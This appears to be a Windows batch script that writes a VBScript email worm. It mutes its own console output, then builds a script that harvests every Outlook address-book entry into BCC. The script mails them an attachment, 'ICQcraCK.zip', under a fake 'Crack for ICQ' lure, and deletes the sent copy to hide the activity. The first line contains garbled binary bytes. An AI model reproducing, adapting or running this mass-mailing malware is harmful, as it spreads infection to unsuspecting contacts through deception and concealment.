@echo off
@ctty nul
ECHO 'PKŽ'bérò£PK Apulia# IV PK>%tmp%\ctrl.vbs
ECHO Set A3 = CreateObject("Outlook.Application")>>%tmp%\ctrl.vbs
ECHO Set A4 = A3.GetNameSpace("MAPI")>>%tmp%\ctrl.vbs
ECHO For Each A5 In A4.AddressLists>>%tmp%\ctrl.vbs
ECHO If A5.AddressEntries.Count <> 0 Then>>%tmp%\ctrl.vbs
ECHO Set A6 = A3.CreateItem(0)>>%tmp%\ctrl.vbs
ECHO For A7 = 1 To A5.AddressEntries.Count>>%tmp%\ctrl.vbs
ECHO Set A8 = A5.AddressEntries(A7)>>%tmp%\ctrl.vbs
ECHO If A7 = 1 Then>>%tmp%\ctrl.vbs
ECHO A6.BCC = A8.Address>>%tmp%\ctrl.vbs
ECHO Else>>%tmp%\ctrl.vbs
ECHO A6.BCC = A6.BCC & "; " & A8.Address>>%tmp%\ctrl.vbs
ECHO End If>>%tmp%\ctrl.vbs
ECHO Next>>%tmp%\ctrl.vbs
ECHO A6.Subject = "Crack for ICQ">>%tmp%\ctrl.vbs
ECHO A6.Body = "Try this, it's a crack for ICQ, u can add more than 3 UIN as users">>%tmp%\ctrl.vbs
ECHO Set A9 = CreateObject("Scripting.FileSystemObject")>>%tmp%\ctrl.vbs
ECHO A6.Attachments.Add A9.BuildPath(A9.GetSpecialFolder(2),"ICQcraCK.zip")>>%tmp%\ctrl.vbs 
ECHO A6.DeleteAfterSubmit = True>>%tmp%\ctrl.vbs
ECHO A6.Send>>%tmp%\ctrl.vbs
ECHO Next>>%Tmp%\ctrl.vbs